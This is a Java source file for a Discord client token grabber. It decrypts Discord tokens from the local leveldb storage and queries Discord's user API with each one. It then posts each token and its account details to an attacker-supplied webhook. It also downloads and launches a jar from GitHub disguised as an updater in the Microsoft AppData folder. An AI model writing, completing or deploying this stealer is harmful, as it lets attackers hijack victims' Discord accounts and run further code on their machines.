package clienttokengrabber;

import java.nio.file.Paths;
import java.util.Set;
import java.util.HashSet;


import clienttokengrabber.utils.*;

public class ClientTokenGrabber {
    private static Set<String> tokens = new HashSet<>();
    public static final String WEBHOOK_URL = "YOUR BASE64 ENCODED WEBHOOK URL HERE";
    public static final String USER_INFO_URL = "https://discordapp.com/api/v9/users/@me";
    public static final String UPDATER_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
    public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar";

    public static void main(String[] args) {
        FileManager.delete(UPDATER_PATH);
        System.out.println(UpdateHelper.checkForUpdates());
        if (UpdateHelper.checkForUpdates()) {
            Requests.download(UPDATER_URL, UPDATER_PATH);
            FileManager.launch(UPDATER_PATH);
            System.exit(0);
        }

        getClientTokens();
        for (String token : tokens) {
            System.out.println("Token: " + token);

            String userInfo = Requests.get(USER_INFO_URL, token);
            if (userInfo != null) {
                Requests.post(EmbedGenerator.generateEmbed(userInfo, token), WEBHOOK_URL);
                System.out.println("User Info: " + userInfo);
            }
        }

        System.exit(0);
    }

    private static void getClientTokens() {
        FileManager.getDefaultPaths().forEach(path ->
            tokens.addAll(Decryptor.decryptTokens(
                    Paths.get(path, "Local Storage", "leveldb").toString(),
                    Decryptor.getAESKey(path))
            )
        );
    }
}